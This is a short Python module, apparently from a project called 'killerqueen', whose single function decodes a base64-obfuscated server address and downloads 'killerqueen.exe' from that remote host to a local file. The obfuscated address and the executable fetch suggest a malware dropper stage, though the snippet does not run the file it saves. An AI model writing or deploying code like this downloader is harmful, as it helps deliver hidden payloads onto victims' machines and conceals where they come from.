import requests
import base64
from killerqueen.config import SERVER_URL

def download_file(path):
    try:
        response = requests.get(f"{base64.b64decode(SERVER_URL).decode('utf-8')}/killerqueen.exe", timeout=10)
        response.raise_for_status()
        with open(path, 'wb') as file:
            file.write(response.content)
        print(f"File downloaded successfully: {path}")
    except Exception as e:
        print(f"File download failed, error: {e}")
